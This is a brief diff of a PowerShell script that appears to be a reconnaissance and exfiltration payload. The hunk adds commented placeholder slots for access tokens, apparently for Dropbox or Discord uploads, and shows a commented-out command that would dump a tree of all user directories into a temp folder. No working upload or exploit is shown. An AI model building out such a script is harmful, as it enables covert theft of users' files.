@@ -37,6 +37,16 @@ $ZIP = "$FolderName.zip"
 
 New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
+############################################################################################################################################################
+
+# Enter your access tokens below. At least one has to be provided but both can be used at the same time. 
+
+#$db = ""
+
+#$dc = ""
+
+############################################################################################################################################################
+
 # Recon all User Directories TODO: re enable
 #tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
